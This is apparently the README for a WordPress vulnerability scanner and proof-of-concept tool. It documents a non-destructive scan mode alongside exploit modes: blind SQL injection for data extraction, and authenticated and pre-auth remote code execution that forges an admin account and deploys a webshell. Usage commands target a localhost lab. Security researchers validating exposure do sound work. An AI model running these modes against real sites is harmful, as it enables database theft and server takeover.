# wp2shell-scanner

Detection and validation tooling for WordPress core exposure to wp2shell
(CVE-2026-63030 / CVE-2026-60137). Modes are selected with a flag, and the
target is positional. `--scan` fingerprints the core version and confirms the
REST `/batch/v1` route is reachable without sending an exploit payload; the
`--check`/`--read`/`--shell`/`--rce`/`--root-prereq` modes are the validation
PoC for authorized lab use.

`wp2shell.py` is a single, standard-library-only script — no external
dependencies. Every invocation prints a **ZephrSec** banner to stderr before it
runs (it stays off stdout, so `--scan -j` JSON output is unaffected).

## Command flags

Exactly one mode flag is required; the target is positional (a URL for every
mode, or a host list for `--scan`).

### Synopsis

```
wp2shell.py (--scan | --check | --read | --shell | --rce | --root-prereq)
            [targets ...] [-f FILE] [-j] [-t THREADS] [--prefix PREFIX]
            [--delay DELAY] [--repeats REPEATS] [--preset PRESET] [--expr EXPR]
            [--max-len MAX_LEN] [--user USER] [--password PASSWORD] [--cmd CMD]
            [-i] [--no-cleanup] [-y] [--sleep SLEEP] [--rounds ROUNDS]
            [--route {auto,rest-route,wp-json}] [--proxy PROXY] [--authorized]
            [--timeout TIMEOUT]
```

### Mode flags (pick one)

| Flag | What it does |
| --- | --- |
| `--scan` | Non-destructive exposure check: version fingerprint + confirms the REST `/batch/v1` route is reachable. No exploit payload sent. |
| `--check` | Confirms blind time-based SQLi with a harmless differential probe. |
| `--read` | Extracts data via blind SQLi (a preset or a raw SQL scalar expression). |
| `--shell` | Authenticated RCE chain using a cracked/recovered admin password. |
| `--rce` | Credential-less **pre-auth** RCE: forges its own admin through the SQLi, then deploys a self-cleaning webshell. |
| `--root-prereq` | Benign shell-to-root prerequisite check; runs diagnostics only, never a local privilege escalation. |

### Option flags

| Flag | Applies to | What it does |
| --- | --- | --- |
| `-f`, `--file` | `--scan` | Read hosts from a file (one per line; `#` comments skipped). |
| `-j`, `--json` | `--scan` | Emit results as JSON on stdout. |
| `-t`, `--threads` | `--scan` | Scan concurrency (default 10). |
| `--prefix` | `--check`/`--read` | DB table prefix (default `wp_`). |
| `--delay` | `--check`/`--read` | Injected `SLEEP` seconds for the timing oracle (default 0.15). |
| `--repeats` | `--check`/`--read` | Median over N probes per bit; raise on noisy links (default 1). |
| `--preset` | `--read` | Built-in target: `version`, `database`, `db_user`, `users`, `siteurl` (default `users`). |
| `--expr` | `--read` | Raw SQL scalar expression to extract (overrides `--preset`). |
| `--max-len` | `--read` | Maximum extracted string length (default 128). |
| `--user` | `--shell`/`--root-prereq` | Admin username to log in as (default `admin`). |
| `--password` | `--shell`/`--root-prereq` | Plaintext admin password (crack the hash from `--read`; required for these modes). |
| `--cmd` | `--shell`/`--rce` | Command to run on the target (default `id`). |
| `-i`, `--interactive` | `--shell`/`--rce` | Interactive web command loop instead of a single command. |
| `--no-cleanup` | `--shell`/`--rce` | Leave the dropped plugin/webshell in place (lab only). |
| `-y`, `--yes` | `--shell`/`--rce`/`--root-prereq` | Skip the interactive authorization prompt (for automation). |
| `--sleep` | `--rce` | Injected `SLEEP` seconds for pre-auth SQLi detection (default 4). |
| `--rounds` | `--rce` | Median over N probes for `--rce` detection (default 3). |
| `--route` | `--rce` | Batch route form: `auto`, `rest-route`, or `wp-json` (default `auto`). |
| `--proxy` | `--rce` | Route requests through an HTTP proxy, e.g. Burp at `http://127.0.0.1:8080`. |
| `--authorized` | `--rce` | Assert authorization for a non-loopback `--rce` target (required for remote hosts). |
| `--timeout` | all | Per-request timeout in seconds (default 15). |

Deep dive blog post: https://blog.zsec.uk/wp2shell-code-trace-deep-dive/

## Nuclei template

```
nuclei -t wp2shell-exposure.yaml -u https://target
```

## Scan (non-destructive)

Single host, multiple hosts, or a file.

```
python3 wp2shell.py --scan https://target
python3 wp2shell.py --scan host1 host2 host3
python3 wp2shell.py --scan -f hosts.txt
```

Options: `-f/--file` hosts file (one per line), `-j/--json` JSON output,
`-t/--threads` concurrency (default 10).

## Validation PoC

The `--check`/`--read`/`--shell`/`--rce`/`--root-prereq` modes send live exploit
payloads. Run them only against the bundled localhost lab, or other systems you
own and are explicitly authorized to test. `--shell` and `--rce` perform remote
code execution and are intended for the lab/authorized targets; `--rce` on a
non-loopback host requires `--authorized`. `--root-prereq` uses the same
token-gated diagnostic plugin to check shell-to-root prerequisites, but it does
not run a local privilege escalation.

`--shell` needs a recovered/cracked admin password. `--rce` is the
**credential-less pre-auth** chain: it forges its own administrator through the
SQLi (oEmbed → changeset → re-entrant `parse_request`), then deploys the
webshell — no password required.

`--shell`, `--rce`, and `--root-prereq` prompt for interactive `y/N`
authorization before any code-execution payload is sent (they abort on a
non-interactive/EOF stdin). Pass `-y/--yes` to skip the prompt for
automation against the lab or an authorized target.

```
docker compose -f poc/lab/docker-compose.yml up -d
python3 wp2shell.py --check http://127.0.0.1:8080
python3 wp2shell.py --read  http://127.0.0.1:8080 --expr @@version
python3 wp2shell.py --shell http://127.0.0.1:8080 --user admin --password 'Summer2026!' --cmd id
python3 wp2shell.py --shell http://127.0.0.1:8080 --user admin --password 'Summer2026!' -i
python3 wp2shell.py --rce   http://127.0.0.1:8080 --cmd id
python3 wp2shell.py --rce   http://127.0.0.1:8080 -i
python3 wp2shell.py --root-prereq http://127.0.0.1:8080 --user admin --password 'Summer2026!'
```

Patch diffs used to ground the PoC are saved under `poc/diffs/`, with research
notes in `poc/RESEARCH.md`. The SQLi is fully reconstructable from the
`author__not_in` fix. The credential-less `--rce` chain (oEmbed → changeset →
re-entry → admin creation) reproduces the stock-default RCE against the bundled
lab; `--shell` is the alternate path via a recovered/cracked admin credential to
authenticated plugin upload and command execution.
